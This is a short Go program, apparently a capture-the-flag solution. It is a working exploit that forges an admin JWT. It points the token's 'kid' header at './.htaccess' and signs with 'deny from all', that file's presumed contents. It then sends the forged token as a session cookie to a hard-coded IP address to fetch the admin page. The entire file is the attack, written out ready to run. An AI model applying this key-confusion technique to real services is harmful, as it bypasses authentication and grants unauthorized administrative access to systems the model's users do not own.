package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"github.com/dgrijalva/jwt-go"
	"errors"
	"strconv"
)

func GenerateJWT(username, role string) (string, error) {
	secretkey := "deny from all"
	var mySigningKey = []byte(secretkey)
	token := jwt.New(jwt.SigningMethodHS256)
	token.Header["kid"] = "./.htaccess"
	claims := token.Claims.(jwt.MapClaims)
	claims["username"] = username
	claims["role"] = role
	tokenString, err := token.SignedString(mySigningKey)
	if err != nil {
		fmt.Errorf("Something Went Wrong: %s", err.Error())
		return "", err
	}
	return tokenString, nil
}

func HTTPwithCookies(url, jwtsession string) (b []byte, err error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
			return
	}

	req.AddCookie(&http.Cookie{Name: "jwtsession", Value: jwtsession})

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
			return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
			err = errors.New(url +
					"\nresp.StatusCode: " + strconv.Itoa(resp.StatusCode))
			return
	}

	return ioutil.ReadAll(resp.Body)
}

func main() {
	jwtToken,_ := GenerateJWT("admin","admin")
	b, err := HTTPwithCookies("http://103.150.221.112:8001/?page=admin", jwtToken)
	if err != nil {
			panic(err)
	}
	println(string(b))
}
